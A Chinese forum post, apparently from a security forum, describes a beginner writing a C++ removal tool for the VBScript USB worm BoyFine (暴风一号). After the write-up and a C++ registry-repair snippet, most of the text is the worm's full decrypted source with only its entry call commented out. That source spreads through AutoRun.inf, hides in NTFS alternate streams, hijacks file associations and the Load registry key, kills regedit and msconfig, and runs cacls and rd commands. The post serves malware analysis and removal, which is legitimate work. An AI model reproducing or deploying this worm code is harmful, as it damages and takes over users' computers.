
# 暴风一号蠕虫病毒专杀详解

> 原文：[`www.pediy.com/kssd/pediy10/103929.html`](https://www.pediy.com/kssd/pediy10/103929.html)

暴风一号不是一个复杂的病毒，但是我是第一次接触`vbs`病毒，所以还是折腾了好多天。在此把暴风一号和暴风一号变种详解过程写出来，供和我一样的初学者参考。

暴风一号（BoyFine）是用`VBScript`写的一个U盘蠕虫病毒，第一次接触`vbs`，所以在别人的提醒下，才知道`vbs`是直接可以用记事本查看源码的，但是暴风一号和暴风一号变种的源码，很明显被加密了，所以就要先解密。

解密好了病毒，查看其源代码：=。=看不懂……想要深入了解病毒，当然要知道它都做了些什么，所以我就开始了痛苦的深入了解过程，一句一句的`Baidu`、`Google`它的函数，这过程确实头疼。某前辈知道我这样做，把我训了一通，说：你似乎离目标更遥远了；怎么容易怎么做。我有点不解，所以就开始思考这个问题。O(∩\_∩)O~最后终于想明白啦，我再这样子分析下去，大概分析完了，`vbs`我都能会了，可其实没必要这样，只要知道病毒破坏了什么地方，把被破坏的地方修复了就可以了。

在虚拟机里，看到表面上看到的是病毒把各个盘符根目录下的所有文件夹都改为了系统文件夹属性，将每个文件夹都显示一个快捷方式，快捷方式上的箭头也给去掉了，这样表面上就好像是真的文件夹。此外，在各个盘符的根目录下产生了随机名称的`****.vbs`病毒，和一个`AutoRun.inf`文件。

用`c++`将以上被破坏的内容修复不是很复杂，将各个盘符下不是系统文件夹的文件夹用`SetFileAttributes`函数设置文件夹属性为`FILE_ATTRIBUTE_NORMAL`即可。然后删除快捷方式，这一点应该注意下，不应该删除所有的快捷方式，毕竟不是所有的快捷方式都是病毒产生的，所以在判断到文件为文件夹时，用`tstrNew1.Insert(tstrNew1.GetLength(),__T(".lnk"));`得到文件夹快捷方式名，然后删除。想要删除随机名称的`****.vbs`也并不复杂，因为只要打开`AutoRun.inf`文件，你就会发现病毒名称就在里面了，只要提取出这个病毒名即可，这样就可以删除掉`****.vbs`了。最后删除`AutoRun.inf`。

表面上的问题解决了，也仅仅是表面上的。查看病毒源码，不难发现，病毒修改了注册表。（⊙⊙b汗！其实以前我都不知道注册表干嘛用的……）

直接从源码中找到所有有关注册表的路径，然后把值修改为它本来的样子。

例如修改其中一项：

```
HKEY hkey;

BOOL boretn = FALSE;

long lResult;

CString DataValue = "";

LPCTSTR lpSubValueName = "load";  //如果是默认的键，设置为 NULL 即可

LPCTSTR lpDataSet = "SoftWare\\Microsoft\\Windows NT\\CurrentVersion\\Windows";

LPBYTE lpDataValue = CString_To_LPBYTE(DataValue);//CString_To_LPBYTE()是自己写的类型转换函数。

lResult = RegOpenKeyEx(HKEY_CURRENT_USER,lpDataSet,0,KEY_WRITE,&hkey);

if (ERROR_SUCCESS != lResult)

    return boretn;

lResult = RegSetValueEx(hkey,lpSubValueName,0,REG_SZ,lpDataValue,lstrlen(DataValue)+1);

if (ERROR_SUCCESS != lResult)

    return boretn;

RegCloseKey(hkey);

boretn = TRUE;

return boretn;
```

上面的病毒行为解决了，但是！没几秒钟就又被破坏了……很明显，病毒还在运行着，而且查看源码还有种种行为，运行着的是用`NTFS`流隐藏着的病毒。

强制关闭进程：要关闭路径为`"C:\\WINDOWS\\system32\\wscript.exe"`和`"C:\\WINDOWS\\system\\svchost.exe"`的进程，已知进程路径，所以一个一个查找进程对应的路径，然后比较是否和要关闭的路径一样，即可关闭对的进程，（写完后我在自己的机器上关闭得了进程，在虚拟机里却关闭不了了）所以过程中得注意权限问题，在`OpenProcess()`的时候，要设置对的权限。关闭了进程后，即可像删除普通文件一样`DeleteFile()`删除寄生在`smss.exe`和`explorer.exe`上的`****.vbs`病毒。

以上就是我写这个病毒专杀的过程，此过程主要是针对暴风一号变种，但解决完变种的各种问题，也就基本解决了暴风一号的所有问题。我这个程序还太简单，少了很多判断，例如：判断注册表是否被修改，如果被修改了再修改过来，所以发我写的源代码仅供学习。

折腾了好多天，反过来又看了下病毒源码，竟然一眼看得懂好多了，看来语言之间还是很多相似之处的。这时候再看，就会发现它其他病毒行为，例如：检查`"cmd.exe"`、`"cmd.com"`、`"regedit.exe"`、`"regedit.scr"`、`"regedit.pif"`、`"regedit.com"`、`"msconfig.exe"`这些程序有没有在运行，如果发现它们在运行的话，就将它关闭。

总结：以上有关知识点，我几乎都是第一次接触，所以期间碰到了太多太多问题，但做完后，回过头看时，真的很简单~碰到的问题倒都是小问题，关键很高兴的是，很多我都自己解决了，记得期间有个`bug`，我怎么调试都调试不出为什么错，折腾了非常长的时间，睡个觉都睡不好，最后还是求助于别人，可是别人看了一下代码就知道问题所在了……是个类型错误……这个问题很显然是`c++`里面最最基础的问题……所以我真的应该好好看书了……很感谢懒人大叔替我解决了这个问题……还有在解决问题时，用最简单的方法去达到目的，恩，很感谢`bbx`的这席话。记得一个和我同样是初学者的朋友，他很聪明，在我和他讨论问题的时候，即使他和我同样不了解这个知识点，但在网上查下就可以很快的明白是怎么一回事，而我理解的速度要比他慢得多，他说：“看来男生的思维和女生的就是不一样，你选择这方面注定你会很坎坷”。恩……听着不服气啊~可是我承认，确实有差别。但是我想，在学习的过程中，无论是什么样情况的人，所追求的学习目标却是不会差别太大的，坚定信念足以。

最后加上原病毒和自己写的源码，因为初学`C++`，编码能力还有待提高，有些地方很乱，不足之处望多指出。

### 上传的附件

| `img/c8c74a380a3dea7fa2460187d80ee5e0.jpg` || `附件.rar`
解压密码：`PEDIY`

### 评论

发个源码，有个专杀就是用源码改的。代码风格不错，值得一学，别搞破坏。`img/c72cb8eba397ac67dda6e1ac58a9b627.jpg`

### 病毒源码

```
On Error Resume Next

Dim Fso, WshShell

Set Fso=CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")

Set WshShell=CreateObject("wScRipT.SHelL")

'Call Main() 注释掉防止运行

Sub Main()

    On Error Resume Next

    Dim Args, VirusLoad, VirusAss

    Args = WScript.Arguments

    VirusLoad = GetMainVirus(1)

    VirusAss = GetMainVirus(0)

    ArgNum = 0

    Do While ArgNum < Args.Count

        Param = Param & " " & Args(ArgNum)

        ArgNum = ArgNum + 1

    Loop

    SubParam = LCase(Right(Param, 3))

    Select Case SubParam

        Case "run"

            RunPath = Left(WScript.ScriptFullName, 2)

            Call Run(RunPath)

            Call InvadeSystem(VirusLoad, VirusAss)

            Call Run("%SystemRoot%\\system\\svchost.exe " & VirusLoad)

        Case "txt", "log", "ini", "inf"

            RunPath = "%SystemRoot%\\system32\\NOTEPAD.EXE " & Param

            Call Run(RunPath)

            Call InvadeSystem(VirusLoad, VirusAss)

            Call Run("%SystemRoot%\\system\\svchost.exe " & VirusLoad)

        Case "bat", "cmd"

            RunPath = "CMD /c echo Hi!I'm here!&pause"

            Call Run(RunPath)

            Call InvadeSystem(VirusLoad, VirusAss)

            Call Run("%SystemRoot%\\system\\svchost.exe " & VirusLoad)

        Case "reg"

            RunPath = "regedit.exe " & """" & Trim(Param) & """"

            Call Run(RunPath)

            Call InvadeSystem(VirusLoad, VirusAss)

            Call Run("%SystemRoot%\\system\\svchost.exe " & VirusLoad)

        Case "chm"

            RunPath = "hh.exe " & """" & Trim(Param) & """"

            Call Run(RunPath)

            Call InvadeSystem(VirusLoad, VirusAss)

            Call Run("%SystemRoot%\\system\\svchost.exe " & VirusLoad)

        Case "hlp"

            RunPath = "winhlp32.exe " & """" & Trim(Param) & """"

            Call Run(RunPath) : Call InvadeSystem(VirusLoad, VirusAss)

            Call Run("%SystemRoot%\\system\\svchost.exe " & VirusLoad)

        Case "dir"

            RunPath = """" & Left(Trim(Param), Len(Trim(Param)) - 3) & """"

            Call Run(RunPath)

            Call InvadeSystem(VirusLoad, VirusAss)

            Call Run("%SystemRoot%\\system\\svchost.exe " & VirusLoad)

        Case "oie"

            RunPath = """%ProgramFiles%\\Internet Explorer\\IEXPLORE.EXE"""

            Call Run(RunPath)

            Call InvadeSystem(VirusLoad, VirusAss)

            Call Run("%SystemRoot%\\system\\svchost.exe " & VirusLoad)

        Case "omc"

            RunPath = "explorer.exe /n,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"

            Call Run(RunPath)

            Call InvadeSystem(VirusLoad, VirusAss)

            Call Run("%SystemRoot%\\system\\svchost.exe " & VirusLoad)

        Case "emc"

            RunPath = "explorer.exe /n,/e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"

            Call Run(RunPath)

            Call InvadeSystem(VirusLoad, VirusAss)

            Call Run("%SystemRoot%\\system\\svchost.exe " & VirusLoad)

        Case Else

            If PreDblInstance = True Then

                WScript.Quit()

            End If

            Timeout = Datediff("ww", GetInfectedDate, Date) - 12

            If Timeout > 0 And Month(Of Date)() = Day(Of Date)() Then

                Call VirusAlert()

                Call MakeJoke(CInt(Month(Of Date)()))

            End If

            Call MonitorSystem()

    End Select

End Sub

Sub MonitorSystem()

    On Error Resume Next

    Dim ProcessNames, ExeFullNames

    ProcessNames = Array("cmd.exe", "cmd.com", "regedit.exe", "regedit.scr", "regedit.pif", "regedit.com", "msconfig.exe")

    VBSFullNames = Array(GetMainVirus(1))

    Do

        Call KillProcess(ProcessNames)

        Call InvadeSystem(GetMainVirus(1), GetMainVirus(0))

        Call KeepProcess(VBSFullNames)

        WScript.Sleep(3000)

    Loop

End Sub

Sub InvadeSystem(ByVal VirusLoadPath, ByVal VirusAssPath)

    On Error Resume Next

    Dim Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version

    Load_Value=""""&VirusLoadPath&""""

    File_Value="%SystemRoot%\\System32\\WScript.exe "&""""&VirusAssPath&""""&" %1 %\* "

    IE_Value="%SystemRoot%\\System32\\WScript.exe "&""""&VirusAssPath&""""&" OIE "

    MyCpt_Value1="%SystemRoot%\\System32\\WScript.exe "&""""&VirusAssPath&""""&" OMC "
```



```
MyCpt_Value2="%SystemRoot%\System32\WScript.exe "&""""&VirusAssPath&""""&" EMC "  

HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"  

HCUVer = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Ver"  

HCUDate = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Date"  

VirusCode = GetCode(WScript.ScriptFullName)  

Version = 1  

HostSourcePath = Fso.GetSpecialFolder(1) & "\Wscript.exe"  

HostFilePath = Fso.GetSpecialFolder(0) & "\system\svchost.exe"  

For Each Drive In Fso.Drives  
    If Drive.IsReady And (Drive.DriveType = 1 Or Drive.DriveType = 2 Or Drive.DriveType = 3) Then  
        DiskVirusName = GetSerialNumber(Drive.DriveLetter) & ".vbs"  
        Call CreateAutoRun(Drive.DriveLetter, DiskVirusName)  
        Call InfectRoot(Drive.DriveLetter, DiskVirusName)  
    End If  
Next  

If FSO.FileExists(VirusAssPath) = False Or FSO.FileExists(VirusLoadPath) = False Or FSO.FileExists(HostFilePath) = False Or GetVersion() < Version Then  
    If GetFileSystemType(GetSystemDrive()) = "NTFS" Then  
        Call CreateFile(VirusCode, VirusAssPath)  
        Call CreateFile(VirusCode, VirusLoadPath)  
        Call CopyFile(HostSourcePath, HostFilePath)  
        Call SetHiddenAttr(HostFilePath)  
    Else  
        Call CreateFile(VirusCode, VirusAssPath)  
        Call SetHiddenAttr(VirusAssPath)  
        Call CreateFile(VirusCode, VirusLoadPath)  
        Call SetHiddenAttr(VirusLoadPath)  
        Call CopyFile(HostSourcePath, HostFilePath)  
        Call SetHiddenAttr(HostFilePath)  
    End If  
End If  

If ReadReg(HCULoad) <> Load_Value Then  
    Call WriteReg(HCULoad, Load_Value, "")  
End If  

If GetVersion() < Version Then  
    Call WriteReg(HCUVer, Version, "")  
End If  

If GetInfectedDate() = "" Then  
    Call WriteReg (HCUDate, Date, "")  
End If  

If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\") <> File_Value Then  
    Call SetTxtFileAss(VirusAssPath)  
End If  

If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inifile\shell\open\command\") <> File_Value Then  
    Call SetIniFileAss(VirusAssPath)  
End If  

If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inffile\shell\open\command\") <> File_Value Then  
    Call SetInfFileAss(VirusAssPath)  
End If  

If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\shell\open\command\") <> File_Value Then  
    Call SetBatFileAss(VirusAssPath)  
End If  

If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\shell\open\command\") <> File_Value Then  
    Call SetCmdFileAss(VirusAssPath)  
End If  

If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\") <> File_Value Then  
    Call SetRegFileAss(VirusAssPath)  
End If  

If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\") <> File_Value Then  
    Call SetchmFileAss(VirusAssPath)  
End If  

If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\") <> File_Value Then  
    Call SethlpFileAss(VirusAssPath)  
End If  

If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Applications\iexplore.exe\shell\open\command\") <> IE_Value Then  
    Call SetIEAss(VirusAssPath)  
End If  

If ReadReg("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command\") <> IE_Value Then  
    Call SetIEAss(VirusAssPath)  
End If  

If ReadReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\open\command\") <> MyCpt_Value1 Then  
    Call SetMyComputerAss(VirusAssPath)  
End If  

If ReadReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\explore\command\") <> MyCpt_Value2 Then  
    Call SetMyComputerAss(VirusAssPath)  
End If  

Call RegSet()  
End Sub  

Sub CopyFile(source, pathf)  
    On Error Resume Next  
    If FSO.FileExists(pathf) Then  
        FSO.DeleteFile(pathf, True)  
    End If  
    FSO.CopyFile(source, pathf)  
End Sub  

Sub CreateFile(code, pathf)  
    On Error Resume Next  
    Dim FileText  
    If FSO.FileExists(pathf) Then  
        FileText = FSO.OpenTextFile(pathf, 2, False)  
        FileText.Write(code)  
        FileText.Close()  
    Else  
        FileText = FSO.OpenTextFile(pathf, 2, True)  
        FileText.Write(code)  
        FileText.Close()  
    End If  
End Sub  

Sub CreateFile(ByVal code, ByVal pathf)  
    On Error Resume Next  
    Dim FileText  
    If FSO.FileExists(pathf) Then  
        FileText = FSO.OpenTextFile(pathf, 2, False)  
        FileText.Write(code)  
        FileText.Close()  
    Else  
        FileText = FSO.OpenTextFile(pathf, 2, True)  
        FileText.Write(code)  
        FileText.Close()  
    End If  
End Sub  

Sub RegSet()  
    On Error Resume Next  
    Dim RegPath1, RegPath2, RegPath3, RegPath4  
    RegPath1 = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue"  
    RegPath2 = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"  
    RegPath3 = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"  
    RegPath4 = "HKEY_CLASSES_ROOT\lnkfile\IsShortcut"  
    Call WriteReg(RegPath1, 3, "REG_DWORD")  
    Call WriteReg(RegPath2, 2, "REG_DWORD")  
    Call WriteReg(RegPath3, 0, "REG_DWORD")  
    Call DeleteReg(RegPath4)  
End Sub  

Sub KillProcess(ByVal ProcessNames)  
    On Error Resume Next  
    WMIService = GetObject("winmgmts:\\.\root\cimv2")  
    For Each ProcessName In ProcessNames  
        Set ProcessList=WMIService.execquery(" Select * From win32_process where name ='"&ProcessName&"' ")  
        For Each Process In ProcessList  
            IntReturn = Process.terminate  
            If intReturn <> 0 Then  
                WshShell.Run("CMD /c ntsd -c q -p " & Process.Handle, vbHide, False)  
            End If  
        Next  
    Next  
End Sub  

Sub KillImmunity(D)  
    On Error Resume Next  
    ImmunityFolder=D&":\Autorun.inf"  
    If Fso.FolderExists(ImmunityFolder) Then  
    WshSHell.Run ("CMD /C CACLS "&""""&ImmunityFolder&"""" &" /t /e /c /g everyone:f"),vbHide,True  
    WshSHell.Run ("CMD /C RD /S /Q "& ImmunityFolder), vbHide, True  
    End If  
End Sub  

Sub KeepProcess(VBSFullNames)  
    On Error Resume Next  
    For Each VBSFullName In VBSFullNames  
        If VBSProcessCount(VBSFullName) < 2 Then  
            Run("%SystemRoot%\system\svchost.exe " & VBSFullName)  
        End If  
    Next  
End Sub  

Function GetSystemDrive()  
    GetSystemDrive = Left(Fso.GetSpecialFolder(0), 2)  
End Function  

Function GetFileSystemType(Drive)  
    d = FSO.GetDrive(Drive)  
    GetFileSystemType = d.FileSystem  
End Function  

Function ReadReg(strkey)  
    Dim tmps  
    tmps = CreateObject("WScript.Shell")  
    ReadReg = tmps.RegRead(strkey)  
    tmps = Nothing  
End Function  

Sub WriteReg(strkey, Value, vtype)  
    Dim tmps  
    tmps = CreateObject("WScript.Shell")  
    If vtype = "" Then  
        tmps.RegWrite(strkey, Value)  
    Else  
        tmps.RegWrite(strkey, Value, vtype)  
    End If  
    tmps = Nothing  
End Sub  

Sub DeleteReg(strkey)  
    Dim tmps  
    tmps = CreateObject("WScript.Shell")  
    tmps.RegDelete(strkey)  
    tmps = Nothing  
End Sub
```



```vb
Sub SetHiddenAttr(path)
    On Error Resume Next
    Dim vf
    vf = FSO.GetFile(path)
    vf = FSO.GetFolder(path)
    vf.Attributes = 6
End Sub

Sub Run(ExeFullName)
    On Error Resume Next
    Dim WshShell
    WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run(ExeFullName)
    WshShell = Nothing
End Sub

Sub InfectRoot(D,VirusName)
    On Error Resume Next
    Dim VBSCode
    VBSCode = GetCode(WScript.ScriptFullName)
    VBSPath=D&":\\"&VirusName
    If FSO.FileExists(VBSPath) = False Then
        Call CreateFile(VBSCode, VBSPath)
        Call SetHiddenAttr(VBSPath)
    End If
    Set Folder=Fso.GetFolder(D&":\\")
    SubFolders = Folder.Subfolders
    For Each SubFolder In SubFolders
        SetHiddenAttr(SubFolder.Path)
        LnkPath=D&":\\"&SubFolder.Name&".lnk"
        TargetPath=D&":\\"&VirusName
        Args=""""&D&":\\"&SubFolder.Name& "\\Dir"""
        If Fso.FileExists(LnkPath) = False Or GetTargetPath(LnkPath) <> TargetPath Then
            If Fso.FileExists(LnkPath) = True Then
                FSO.DeleteFile(LnkPath, True)
            End If
            Call CreateShortcut(LnkPath, TargetPath, Args)
        End If
    Next
End Sub

Sub CreateShortcut(LnkPath,TargetPath,Args)
    Shortcut = WshShell.CreateShortcut(LnkPath)
    With Shortcut
        .TargetPath = TargetPath
        .Arguments = Args
        .WindowStyle = 4
        .IconLocation = "%SystemRoot%\\System32\\Shell32.dll, 3"
        .Save()
    End With
End Sub

Sub CreateAutoRun(D,VirusName)'设置自动运行
    On Error Resume Next
    Dim InfPath, VBSPath, VBSCode
    InfPath=D&":\\AutoRun.inf"
    VBSPath=D&":\\"&VirusName
    VBSCode = GetCode(WScript.ScriptFullName)
    If FSO.FileExists(InfPath) = False Or FSO.FileExists(VBSPath) = False Then
        Call CreateFile(VBSCode, VBSPath)
        Call SetHiddenAttr(VBSPath)
        StrInf="\[AutoRun\]"&VBCRLF&"Shellexecute=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell\\open=打开(&O)"&VBCRLF&"shell\\open\\command=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell\\open\\Default=1"& VBCRLF&"shell\\explore=资源管理器(&X)"&VBCRLF&"shell\\explore\\command=WScript.exe "&VirusName&" ""AutoRun"""
        Call KillImmunity(D)
        Call CreateFile(StrInf, InfPath)
        Call SetHiddenAttr(InfPath)
    End If
End Sub

Sub SetTxtFileAss(ByVal sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" %1 %\* "
    Call WriteReg("HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Classes\\txtfile\\shell\\open\\command\\", Value, "REG\_EXPAND\_SZ")
End Sub

Sub SetIniFileAss(ByVal sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" %1 %\* "
    Call WriteReg("HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Classes\\inifile\\shell\\open\\command\\", Value, "REG\_EXPAND\_SZ")
End Sub

Sub SetInfFileAss(ByVal sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" %1 %\* "
    Call WriteReg("HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Classes\\inffile\\shell\\open\\command\\", Value, "REG\_EXPAND\_SZ")
End Sub

Sub SetBatFileAss(ByVal sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" %1 %\* "
    Call WriteReg("HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Classes\\batfile\\shell\\open\\command\\", Value, "REG\_EXPAND\_SZ")
End Sub

Sub SetCmdFileAss(ByVal sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" %1 %\* "
    Call WriteReg("HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Classes\\cmdfile\\shell\\open\\command\\", Value, "REG\_EXPAND\_SZ")
End Sub

Sub SethlpFileAss(ByVal sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" %1 %\* "
    Call WriteReg("HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Classes\\hlpfile\\shell\\open\\command\\", Value, "REG\_EXPAND\_SZ")
End Sub

Sub SetRegFileAss(ByVal sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" %1 %\* "
    Call WriteReg("HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Classes\\regfile\\shell\\open\\command\\", Value, "REG\_EXPAND\_SZ")
End Sub

Sub SetchmFileAss(ByVal sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" %1 %\* "
    Call WriteReg("HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Classes\\chm.file\\shell\\open\\command\\", Value, "REG\_EXPAND\_SZ")
End Sub

Sub SetIEAss(ByVal sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" OIE "
    Call WriteReg("HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Classes\\Applications\\iexplore.exe\\shell\\open\\command\\", Value, "REG\_EXPAND\_SZ")
    Call WriteReg("HKEY\_CLASSES\_ROOT\\CLSID\\{871C5380-42A0-1069-A2EA-08002B30309D}\\shell\\OpenHomePage\\Command\\", Value, "REG\_EXPAND\_SZ")
End Sub

Sub SetMyComputerAss(ByVal sFilePath)
    On Error Resume Next
    Dim Value1, Value2
    Value1="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" OMC "
    Value2="%SystemRoot%\\System32\\WScript.exe "&""""&sFilePath&""""&" EMC "
    Call WriteReg("HKEY\_CLASSES\_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\shell\\", "", "REG\_SZ")
    Call WriteReg("HKEY\_CLASSES\_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\shell\\open\\command\\", Value1, "REG\_EXPAND\_SZ")
    Call WriteReg("HKEY\_CLASSES\_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\shell\\explore\\command\\", Value2, "REG\_EXPAND\_SZ")
End Sub

Function GetSerialNumber(ByVal Drv)'获取驱动器序列号
    On Error Resume Next
    d = fso.GetDrive(Drv)
    GetSerialNumber = d.SerialNumber
    GetSerialNumber = Replace(GetSerialNumber, "-", "")
End Function

Function GetMainVirus(ByVal N)
    On Error Resume Next
    MainVirusName = GetSerialNumber(GetSystemDrive()) & ".vbs"'硬盘序列号作为病毒名
    If GetFileSystemType(GetSystemDrive()) = "NTFS" Then
        If N = 1 Then
            GetMainVirus = Fso.GetSpecialFolder(N) & "\\smss.exe:" & MainVirusName
        End If
        If N = 0 Then
            GetMainVirus = Fso.GetSpecialFolder(N) & "\\explorer.exe:" & MainVirusName
        End If
    Else
        GetMainVirus = Fso.GetSpecialFolder(N) & "\\" & MainVirusName
    End If
End Function

Function VBSProcessCount(ByVal VBSPath)
    On Error Resume Next
    Dim WMIService, ProcessList, Process
    VBSProcessCount = 0
    WMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
    ProcessList = WMIService.ExecQuery("Select \* from Win32\_Process Where " & "Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'")
    For Each Process In ProcessList
        If InStr(Process.CommandLine, VBSPath) > 0 Then
            VBSProcessCount = VBSProcessCount + 1
        End If
    Next
End Function

Function PreDblInstance()
    On Error Resume Next
    PreDblInstance = False
    If VBSProcessCount(WScript.ScriptFullName) >= 3 Then
        PreDblInstance = True
    End If
End Function

Function GetTargetPath(ByVal LnkPath)
    On Error Resume Next
    Dim Shortcut
    Shortcut = WshShell.CreateShortcut(LnkPath)
    GetTargetPath = Shortcut.TargetPath
End Function

Function GetCode(ByVal FullPath)
    On Error Resume Next
    Dim FileText
    FileText = FSO.OpenTextFile(FullPath, 1)
    GetCode = FileText.ReadAll
    FileText.Close()
End Function

Function GetVersion()
```



```vb
    Dim VerInfo  

    VerInfo = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Ver"  

    If ReadReg(VerInfo) = "" Then  

        GetVersion = 0  

    Else  

        GetVersion = CInt(ReadReg(VerInfo))  

    End If  

End Function  

Sub VirusAlert()  

    On Error Resume Next  

    Dim HtaPath, HtaCode  

    HtaPath = Fso.GetSpecialFolder(1) & "\\BFAlert.hta"  

    HtaCode="<HTML><HEAD><TITLE>暴风一号</TITLE>"&VBCRLF&"<HTA:APPLICATION APPLICATIONNAME=""BoyFine V1.0"" SCROLL=""no"" windowstate=""maximize"" border=""none"""&VBCRLF&"SINGLEINSTANCE=""yes"" CAPTION=""no"" contextMenu=""no"" ShowInTaskBar=""no"" selection=""no"">"&VBCRLF&"</HEAD><BODY bgcolor=#000000><DIV align =""center"">"&VBCRLF&"<font style=""font-size:3500%;font-family:Wingdings;color=red"">N</font><BR>"&VBCRLF&"<font style=""font-size:200%;font-family:黑体;color=red"">暴风一号</font>"&VBCRLF&"</DIV></BODY></HTML>"  

    If FSO.FileExists(HtaPath) = False Then  

        Call CreateFile(HtaCode, HtaPath)  

        Call SetHiddenAttr(HtaPath)  

    End If  

    Call Run(HtaPath)  

End Sub  

Function GetInfectedDate()  

    On Error Resume Next  

    Dim DateInfo  

    DateInfo = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Date"  

    If ReadReg(DateInfo) = "" Then  

        GetInfectedDate = ""  

    Else  

        GetInfectedDate = CDate(ReadReg(DateInfo))  

    End If  

End Function  

Sub MakeJoke(ByVal Times)  

    On Error Resume Next  

    Dim WMP, colCDROMs  

    WMP = CreateObject("WMPlayer.OCX")  

    colCDROMs = WMP.cdromCollection  

    If colCDROMs.Count > 0 Then  

        For i = 1 To Times  

            colCDROMs.Item(0).eject()  

            WScript.Sleep(3000)  

            colCDROMs.Item(0).eject()  

        Next  

    End If  

    WMP = Nothing  

End Sub
```
